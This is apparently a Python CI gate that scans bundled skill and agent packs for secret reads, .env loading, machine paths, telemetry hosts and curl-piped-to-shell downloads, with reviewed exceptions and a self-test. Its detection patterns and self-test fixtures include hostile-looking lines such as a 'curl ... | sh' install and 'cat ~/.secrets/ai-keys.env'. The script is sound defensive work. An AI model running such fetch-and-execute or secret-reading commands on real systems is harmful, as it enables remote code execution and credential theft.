#!/usr/bin/env python3
"""Gate: no pack reads secrets, names internal tooling, phones home or runs a download.

Scans every text file of every pack (a systems/<name>/ bundle with installable content, or
with a pack.json) and fails with file:line for each hit. Rules (optional-packs architecture, C6):

  secret-read      reads of ~/.secrets or ~/keys
  env-file-read    reads of a .env file (not .env.example and friends): shell readers such as
                   cat or source, a ".env" path in code, or a dotenv loader
  machine-path     a concrete /Users/<name> or /home/<name> path, or C:\\Users\\<name>
  internal-name    names of internal tooling, whole words and hyphenated compounds.
                   Spellings are not stored. At scan time they are read from
                   COCO_PACK_CONTENT_NAMES or tests/pack-content-names.local.
                   With neither, this rule is skipped and a ::notice:: is printed.
  telemetry-host   an ingestion host of PostHog, Segment, Mixpanel, Amplitude or Sentry. A vendor
                   blog link is not a telemetry host, so only the ingestion hosts are matched.
  curl-pipe-shell  curl or wget piped to a shell, or run as sh -c "$(curl ...)" or bash <(curl ...)
  download-exec    chmod that makes a file executable, within 4 lines after curl or wget

This is a tripwire for the obvious forms, not a sandbox: it reads line by line, so a split
command or an encoded payload gets past it.

A hit is excused by an exception: {path, reason}, plus optional rule and contains. `path` is a glob
relative to the pack in which * and ? stay inside one path segment, `rule` limits the exception to
one rule, `contains` to lines holding that text. Without `rule`, every rule is excused for that path. Exceptions come from `content_exceptions` in the
pack's pack.json and from ALLOW below, which holds the reviewed ones for bundles that have none
yet. An exception that no longer excuses anything fails the gate: delete it. pack.json itself is
not scanned, because its exceptions quote the text they excuse.

Run from repo root:
  python3 tests/check-pack-content.py              # check the real tree
  python3 tests/check-pack-content.py --self-test  # fixtures, plus the name rule with and
                                                    # without a name list
"""
import contextlib
import fnmatch
import io
import json
import os
import re
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "tests" / "fixtures" / "pack-content"

# A .env file that can hold secrets. Not a template (.env.example), not .envrc, .environ or a
# .env/ virtualenv, and not a property access such as process.env or a spread such as ...env.
ENV_FILE = (r"(?<![\w\\.])\.env(?!\.(?:example|sample|template|dist|defaults)\b)"
            r"(?:\.[A-Za-z][\w-]*)?(?![\w(\[/-])")
TELEMETRY_HOSTS = "|".join((
    r"(?:us|eu)(?:-assets)?\.i\.posthog\.com", r"(?:app|us|eu)\.posthog\.com",
    r"(?:api|cdn|events)\.segment\.(?:io|com)",
    r"(?:api|api-js|api-eu|api-in|decide)\.mixpanel\.com", r"cdn\.mxpnl\.com",
    r"(?:api2?|api\.eu|cdn)\.amplitude\.com",
    r"[\w.-]*ingest(?:\.[a-z]{2})?\.sentry\.io",
))


# A word, or words joined by hyphens. Hyphen is not a word character, so a name also
# matches inside a longer hyphenated chain: every bounded sub-compound is a candidate.
_COMPOUND = re.compile(r"\w+(?:-\w+)*")
# Clear spellings for the internal-name rule. The env var wins when it is non-empty.
# Otherwise the gitignored file. Entries are comma- or newline-separated. Prefix
# exact: for a spelling that matches only in that case. With neither, the rule is skipped.
NAMES_ENV = "COCO_PACK_CONTENT_NAMES"
NAMES_FILE = ROOT / "tests" / "pack-content-names.local"
MISSING_NAMES_NOTICE = (
    "::notice::COCO_PACK_CONTENT_NAMES is not set and "
    "tests/pack-content-names.local is absent; skipping the internal-name rule")
SHELL = r"(?:ba|z|da|k)?sh"
FETCH = r"(?:curl|wget)"
# Where a shell command can start: a line start (after a list marker or prompt), ; & | ` or (.
COMMAND = r"(?:^\s*(?:[-*+]\s+)?(?:[$>]\s+)?|[;&|`(]\s*)(?:sudo\s+)?"

RULES = {
    "secret-read": re.compile(r"(?:~|\$HOME|\$\{HOME\})/(?:\.secrets|keys)\b|[\"'/]\.secrets\b"),
    "env-file-read": re.compile(
        COMMAND + r"(?:cat|less|more|head|tail|source|grep|egrep|fgrep|rg|awk|sed|xargs|\.)\s+"
        r"[^\n|;&]{0,80}?" + ENV_FILE
        + r"|[\"'/]" + ENV_FILE + r"[\"']"
        + r"|\b(?:load_dotenv|dotenv_values|find_dotenv)\b|\bdotenv\.config\("
        + r"|(?:require\(|from\s+|import\s+)[\"']?dotenv\b"),
    "machine-path": re.compile(
        r"(?:(?<![\w/.~$-])|(?<=file://))/(?:Users|home)/[A-Za-z0-9._][A-Za-z0-9._-]*"
        r"|\b[A-Za-z]:\\{1,2}Users\\{1,2}[A-Za-z0-9._][A-Za-z0-9._-]*"),
    "telemetry-host": re.compile(
        r"(?<![\w.-])(?:" + TELEMETRY_HOSTS + r")\b|\b[0-9a-f]{16,}@[\w.-]*sentry\.io\b"),
    "curl-pipe-shell": re.compile(
        r"\b" + FETCH + r"\b[^\n|]{0,300}\|\s*(?:sudo\s+(?:-\S+\s+)*)?" + SHELL + r"\b"
        r"|\b" + SHELL + r"\s+(?:-\w+\s+)*[\"']?\$\(\s*" + FETCH + r"\b"
        r"|<\(\s*" + FETCH + r"\b"
        r"|\b(?:iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b[^\n|]{0,300}\|\s*"
        r"(?:iex|Invoke-Expression)\b"),
}
DOWNLOAD = re.compile(r"\b(?:curl|wget|iwr|Invoke-WebRequest)\b")
CHMOD = re.compile(r"\bchmod\s+(?:-\w+\s+)*(\S+)")
SKIP_DIRS = {".git", "node_modules", "__pycache__"}

# Reviewed exceptions for bundles that have no pack.json yet. Each says what the line is and why it
# is acceptable. They move into the bundle's pack.json `content_exceptions` once it has one.
ALLOW = [
    {"pack": "cognee", "path": "skills/cognee/SKILL.md", "rule": "machine-path",
     "contains": "/home/user/",
     "reason": "example project paths for the dataset-naming rule; user is a placeholder"},
    {"pack": "gsd", "path": "agents/gsd-user-profiler.md", "rule": "machine-path",
     "contains": "/Users/john/",
     "reason": "lists the absolute-path patterns the profiler must redact; john is a placeholder"},
    {"pack": "gsd", "path": "skills/gsd-reapply-patches/SKILL.md", "rule": "machine-path",
     "contains": "/Users/xxx/.claude/",
     "reason": "a path-substitution example; xxx is a placeholder"},
    {"pack": "hyperframes", "path": "skills/media-use/audio/scripts/lib/heygen.mjs",
     "rule": "env-file-read", "contains": 'join(dir, ".env")',
     "reason": "vendored HeyGen credential resolver: loadEnvFromDir() copies the nearest project "
               ".env (up to 5 parent directories) into process.env, shell variables winning. "
               "Upstream's documented auto-load; stays excused only until the bundle's security "
               "review decides whether to keep it"},
    {"pack": "hyperframes", "path": "skills/media-use/audio/scripts/lib/tts.spawn.test.mjs",
     "rule": "machine-path", "contains": "Users\\\\Test User",
     "reason": "a made-up Windows path in a spawn test"},
    {"pack": "hyperframes", "path": "skills/media-use/scripts/lib/telemetry.mjs",
     "rule": "telemetry-host", "contains": "us.i.posthog.com",
     "reason": "vendored upstream endpoint for media-use usage telemetry. The change that makes it "
               "opt-in (COCO_HYPERFRAMES_TELEMETRY=1) is recorded in "
               "systems/hyperframes/MODIFICATIONS.md; once that has landed, tighten this entry so "
               "the file is excused only while the guard is present"},
    {"pack": "reverse-skill", "path": "skills/apk-reverse/SKILL.md", "rule": "curl-pipe-shell",
     "contains": "curl|sh",
     "reason": "describes a malware behaviour to record as evidence, and says not to run it"},
    {"pack": "reverse-skill", "path": "skills/pentest-tools/references/pentest-ai-agents-matrix.md",
     "rule": "curl-pipe-shell", "contains": "pentest-ai-agents/main/install.sh",
     "reason": "a reference page quoting a third-party tool's own optional install one-liner; "
               "the page says it can be skipped, and Coco never runs it"},
    {"pack": "reverse-skill", "path": "skills/reverse-engineering/languages-compiled.md",
     "rule": "machine-path", "contains": "/home/user/go/src/",
     "reason": "a placeholder Go build path given as a detection hint"},
    {"pack": "reverse-skill",
     "path": "skills/reverse-engineering/references/nonpe-format-cookbook.md",
     "rule": "curl-pipe-shell", "contains": "curl|sh",
     "reason": "a table row describing a malware behaviour class to detect"},
    {"pack": "reverse-skill", "path": "skills/reverse-engineering/tools-advanced.md",
     "rule": "curl-pipe-shell", "contains": "gef.blah.cat/sh",
     "reason": "a reference page quoting the GEF debugger plugin's own install one-liner; "
               "Coco never runs it"},
]


def installable(d):
    """True when an installer would link something out of this bundle (see link_system)."""
    return (any(p.is_dir() for p in (d / "skills").glob("*"))
            or any((t / "SKILL.md").is_file() for t in d.iterdir() if t.is_dir())
            or any(d.glob("agents/*.md")) or any(d.glob("commands/*.md")))


def executable(mode):
    """True when a chmod mode sets an execute bit."""
    if re.fullmatch(r"[0-7]{3,4}", mode):
        return any(digit in "1357" for digit in mode)
    return bool(re.search(r"[+=][rwXst]*x", mode))


def name_tokens(line):
    """Words and hyphenated compounds, including a name inside a longer chain."""
    for match in _COMPOUND.finditer(line):
        parts = match.group(0).split("-")
        for size in range(1, len(parts) + 1):
            for start in range(len(parts) - size + 1):
                yield "-".join(parts[start:start + size])


def internal_name(line, fold, exact):
    """True when a token is a blocked spelling.

    `fold` holds lowercased spellings and matches in any case. `exact` holds
    spellings that match only as written.
    """
    for token in name_tokens(line):
        if token.lower() in fold or token in exact:
            return True
    return False


def scan_lines(lines, fold=frozenset(), exact=frozenset(), check_names=True):
    """Yield (line number, rule, line) for every rule that fires.

    `check_names` is false when the name list is absent. The internal-name rule
    is skipped, and every other rule still runs.
    """
    for n, line in enumerate(lines, 1):
        if check_names and internal_name(line, fold, exact):
            yield n, "internal-name", line
        for rule, rx in RULES.items():
            if rx.search(line):
                yield n, rule, line
        m = CHMOD.search(line)
        if m and executable(m.group(1)) and any(DOWNLOAD.search(l) for l in lines[max(0, n - 5):n]):
            yield n, "download-exec", line


def pack_files(d):
    """Text files of one pack, as paths relative to it. pack.json is metadata, not content."""
    for f in sorted(d.rglob("*")):
        rel = f.relative_to(d)
        if (not f.is_file() or f.is_symlink() or rel == Path("pack.json")
                or SKIP_DIRS & set(rel.parts)):
            continue
        with f.open("rb") as fh:
            head = fh.read(8192)
            if b"\0" in head:  # binary: skip it without reading the rest
                continue
            data = head + fh.read()
        yield rel.as_posix(), data.decode("utf-8", "replace").splitlines()


def valid_exception(e):
    """A path and a reason are required; rule and contains, when given, must be real text.

    Any other key is a typo that would silently widen the exception, so it is rejected."""
    return (isinstance(e, dict)
            and set(e) <= {"path", "reason", "rule", "contains"}
            and all(isinstance(e.get(k), str) and e[k].strip() for k in ("path", "reason"))
            and all(isinstance(e[k], str) and e[k].strip() for k in ("rule", "contains") if k in e))


def pack_exceptions(d, allow, errors):
    exceptions = [dict(e, where="ALLOW in tests/check-pack-content.py") for e in allow
                  if e["pack"] == d.name]
    f = d / "pack.json"
    if f.is_file():
        try:
            listed = json.loads(f.read_text(encoding="utf-8")).get("content_exceptions", [])
        except (ValueError, AttributeError):
            listed = None
        if not (isinstance(listed, list) and all(map(valid_exception, listed))):
            errors.append(f"systems/{d.name}/pack.json: content_exceptions must be a list of "
                          "objects with a path and a reason, and optionally a rule and contains "
                          "that are not empty; other keys are rejected")
            listed = []
        exceptions += [dict(e, where=f"systems/{d.name}/pack.json") for e in listed]
    return exceptions


def path_matches(pattern, rel):
    """Glob match where * and ? stay inside one path segment, unlike fnmatch."""
    parts, names = pattern.split("/"), rel.split("/")
    return len(parts) == len(names) and all(
        fnmatch.fnmatchcase(n, p) for p, n in zip(parts, names))


def excuses(e, rel, rule, line):
    return (path_matches(e["path"], rel) and e.get("rule", rule) == rule
            and e.get("contains", line) in line)


def scan(root, allow, fold=frozenset(), exact=frozenset(), check_names=True):
    """Return (hits, unused, errors) for every pack under root/systems.

    A hit is "systems/<pack>/<file>:<line>: [rule] <text>"; unused lists exceptions that excused
    nothing."""
    hits, unused, errors = [], [], []
    for d in sorted(p for p in (root / "systems").iterdir() if p.is_dir()):
        if not ((d / "pack.json").is_file() or installable(d)):
            continue
        exceptions = pack_exceptions(d, allow, errors)
        used = set()
        for rel, lines in pack_files(d):
            for n, rule, line in scan_lines(lines, fold, exact, check_names):
                matching = [i for i, e in enumerate(exceptions) if excuses(e, rel, rule, line)]
                used.update(matching)
                if not matching:
                    hits.append(f"systems/{d.name}/{rel}:{n}: [{rule}] {line.strip()[:120]}")
        unused += [f"{e['where']}: exception for {e['path']!r} excuses nothing; delete it"
                   for i, e in enumerate(exceptions) if i not in used]
    return hits, unused, errors


def parse_name_list(text):
    """Split a name list into (case-insensitive spellings, exact spellings)."""
    fold, exact = [], []
    for line in text.splitlines():
        for chunk in line.split(","):
            item = chunk.split("#", 1)[0].strip()
            if not item:
                continue
            if item.startswith("exact:"):
                name = item[len("exact:"):].strip()
                if name:
                    exact.append(name)
            else:
                fold.append(item)
    return fold, exact


def load_name_list():
    """Clear spellings for a scan, or None when neither source is set.

    COCO_PACK_CONTENT_NAMES wins when it is non-empty. Otherwise the gitignored
    tests/pack-content-names.local file.
    """
    env = os.environ.get(NAMES_ENV, "").strip()
    if env:
        fold, exact = parse_name_list(env)
        return (fold, exact) if fold or exact else None
    if NAMES_FILE.is_file():
        text = NAMES_FILE.read_text(encoding="utf-8").strip()
        if text:
            fold, exact = parse_name_list(text)
            return (fold, exact) if fold or exact else None
    return None


def scan_with_policy(root, allow, loaded):
    """Scan packs. `loaded` is (fold spellings, exact spellings), or None.

    None means neither name source is set: print a ::notice:: and skip only the
    internal-name rule. The other rules still run.
    """
    if loaded is None:
        print(MISSING_NAMES_NOTICE)
        return scan(root, allow, check_names=False)
    fold_names, exact_names = loaded
    return scan(root, allow, frozenset(name.lower() for name in fold_names), frozenset(exact_names))


def planted_name_failures(fold_names, exact_names):
    """Plant spellings in a throwaway pack. Return (failures, flagged line count)."""
    names = [("fold", name) for name in fold_names] + [("exact", name) for name in exact_names]
    if not names:
        return ["the name list was empty"], 0
    lines = [f"run {name} now" for _, name in names]
    lines += [f"{name}x is a near miss" for _, name in names]
    probes = []
    for kind, name in names:
        if kind == "fold" and name.upper() != name:
            probes.append((f"run {name.upper()} now", True))
        elif kind == "exact" and name.lower() != name:
            probes.append((f"run {name.lower()} now", False))
    hyphenated = next((name for kind, name in names if kind == "fold" and "-" in name), None)
    if hyphenated:
        probes.append((f"see {hyphenated}-extra", True))
        probes.append((f"see pre-{hyphenated}", True))
    lines += [text for text, _ in probes]
    with tempfile.TemporaryDirectory() as tmp:
        pack = Path(tmp) / "systems" / "names"
        pack.mkdir(parents=True)
        (pack / "pack.json").write_text("{}")
        (pack / "lines.md").write_text("\n".join(lines) + "\n")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            hits = scan_with_policy(Path(tmp), [], (fold_names, exact_names))[0]
        notice = buf.getvalue()
        flagged = {int(hit.split(":")[1]) for hit in hits if "[internal-name]" in hit}
    failures = []
    if notice:
        failures.append("a present name list must not print the missing-list notice")
    count = len(names)
    failures += [f"internal name {i + 1} of {count} was not flagged"
                 for i in range(count) if i + 1 not in flagged]
    failures += [f"a near miss of internal name {i + 1} was flagged"
                 for i in range(count) if count + i + 1 in flagged]
    base = count * 2
    for i, (_, should) in enumerate(probes):
        if (base + i + 1 in flagged) != should:
            failures.append(
                f"case variant {i + 1} of {len(probes)} "
                + ("was not flagged" if should else "was flagged"))
    return failures, len(flagged)


def missing_list_failures():
    """Without a name list, only the internal-name rule is skipped."""
    failures = []
    with tempfile.TemporaryDirectory() as tmp:
        pack = Path(tmp) / "systems" / "skip"
        pack.mkdir(parents=True)
        (pack / "pack.json").write_text("{}")
        (pack / "lines.md").write_text("run zz-pack-gate-tool now\ncat ~/.secrets/ai-keys.env\n")
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            hits, unused, errors = scan_with_policy(Path(tmp), [], None)
    if buf.getvalue() != MISSING_NAMES_NOTICE + "\n":
        failures.append("missing name list must print a ::notice:: and skip only that rule")
    flagged = [h.split("[", 1)[1].split("]", 1)[0] for h in hits]
    if flagged != ["secret-read"]:
        failures.append(f"missing name list must keep the other rules only, got {hits}")
    if unused or errors:
        failures.append(f"missing name list scan reported {unused} {errors}")
    return failures


def source_failures():
    """The env var and the gitignored file are the only name sources, and env wins."""
    failures = []
    saved = os.environ.get(NAMES_ENV)
    try:
        os.environ[NAMES_ENV] = "zz-pack-gate-tool, exact:ZzPackGate"
        if load_name_list() != (["zz-pack-gate-tool"], ["ZzPackGate"]):
            failures.append("COCO_PACK_CONTENT_NAMES was not the name list used at scan time")
        else:
            found, _ = planted_name_failures(["zz-pack-gate-tool"], ["ZzPackGate"])
            failures += found
        os.environ.pop(NAMES_ENV, None)
        if NAMES_FILE.is_file():
            loaded = load_name_list()
            if not loaded:
                failures.append("tests/pack-content-names.local was not read")
            else:
                found, nflag = planted_name_failures(*loaded)
                failures += found
                print(f"  local file: {len(loaded[0]) + len(loaded[1])} planted, {nflag} reported")
        else:
            NAMES_FILE.write_text("# local only\nzz-from-file\nexact:ZzFromFile\n", encoding="utf-8")
            try:
                os.environ[NAMES_ENV] = "zz-pack-gate-tool"
                if load_name_list() != (["zz-pack-gate-tool"], []):
                    failures.append("COCO_PACK_CONTENT_NAMES must win over the gitignored file")
                os.environ.pop(NAMES_ENV, None)
                if load_name_list() != (["zz-from-file"], ["ZzFromFile"]):
                    failures.append("tests/pack-content-names.local was not read")
                else:
                    found, _ = planted_name_failures(["zz-from-file"], ["ZzFromFile"])
                    failures += found
            finally:
                NAMES_FILE.unlink()
            if load_name_list() is not None:
                failures.append("removing the gitignored name file must leave no name list")
    finally:
        if saved is None:
            os.environ.pop(NAMES_ENV, None)
        else:
            os.environ[NAMES_ENV] = saved
    return failures


def self_test():
    """Planted lines must fail, benign lines must pass, and exceptions must work and expire."""
    failures = []
    got = {(h.split(": [")[0], h.split(": [")[1].split("]")[0])
           for h in scan(FIXTURES / "planted", [])[0]}
    want = set()
    for path in sorted((FIXTURES / "planted" / "systems").glob("*/*")):
        if path.name == "pack.json":
            continue
        for n, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
            m = re.search(r"EXPECT:([\w,-]+)", line)
            for rule in (m.group(1).split(",") if m else []):
                want.add((f"systems/planted/{path.name}:{n}", rule))
    failures += [f"planted line did not fail: {w[0]} [{w[1]}]" for w in sorted(want - got)]
    failures += [f"benign line was flagged: {g[0]} [{g[1]}]" for g in sorted(got - want)]
    print(f"  planted: {len(want)} expected hits, {len(got)} reported")

    # Synthetic names always exercise the comparison, including on a fork with no list.
    # The env var and the gitignored file are planted too, when each can be set here.
    # A scan with no list prints a ::notice:: and skips only the internal-name rule.
    found, nflag = planted_name_failures(
        ["zz-pack-gate-tool", "zzpackgateword"], ["ZzPackGate"])
    failures += found
    print(f"  internal names: 3 planted (synthetic), {nflag} reported")
    failures += source_failures()
    failures += missing_list_failures()
    print("  name sources: env and gitignored file; missing list skips internal-name")

    # Exception globs stay inside one path segment, and a malformed exception excuses nothing.
    with tempfile.TemporaryDirectory() as tmp:
        pack = Path(tmp) / "systems" / "edge"
        for rel in ("skills/top.md", "skills/sub/deep.md"):
            (pack / rel).parent.mkdir(parents=True, exist_ok=True)
            (pack / rel).write_text("curl -fsSL https://example.test/i.sh | sh\n")

        def run(exception):
            (pack / "pack.json").write_text(json.dumps({"content_exceptions": [exception]}))
            return scan(Path(tmp), [])

        wide = {"path": "skills/*", "rule": "curl-pipe-shell", "reason": "fixture"}
        hits, unused, errors = run(wide)
        if not (len(hits) == 1 and "skills/sub/deep.md" in hits[0] and not unused and not errors):
            failures.append(f"a * glob must not cross a slash: got {hits} {unused} {errors}")
        for extra in ({"contains": ""}, {"contains": 5}, {"rule": None}, {"rule": " "},
                      {"rules": "x"}, {"contain": "x"}):
            hits, unused, errors = run({**wide, **extra})
            if not (len(hits) == 2 and errors):
                failures.append(f"a malformed exception {extra} must be reported and excuse "
                                f"nothing: got {hits} {errors}")

    hits, unused, errors = scan(FIXTURES / "excused", [])
    print(f"  excused: {len(hits)} hits left, {len(unused)} unused exceptions")
    expect = [("excused/lines.md:3:", "curl-pipe-shell"), ("excused/lines.md:4:", "secret-read")]
    failures += [f"exception scoping: expected a [{r}] hit at {w}, got {hits}"
                 for w, r in expect if not any(w in h and f"[{r}]" in h for h in hits)]
    if len(hits) != len(expect):
        failures.append(f"exception scoping: expected {len(expect)} hits, got {hits}")
    if len(unused) != 1 or "gone.md" not in unused[0]:
        failures.append(f"an exception that excuses nothing must be reported, got {unused}")
    if errors:
        failures.append(f"unexpected errors: {errors}")
    for f in failures:
        print(f"  FAIL: {f}")
    print("self-test:", "every rule fires, nothing benign is flagged" if not failures
          else f"{len(failures)} problem(s)")
    return 1 if failures else 0


def main(argv):
    if "--self-test" in argv:
        return self_test()
    hits, unused, errors = scan_with_policy(ROOT, ALLOW, load_name_list())
    for line in errors + unused + hits:
        print(f"  FAIL: {line}")
    if hits or unused or errors:
        return 1
    print("PASS: no pack content trips a rule "
          f"({len(ALLOW)} exceptions in ALLOW, plus any in pack.json)")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
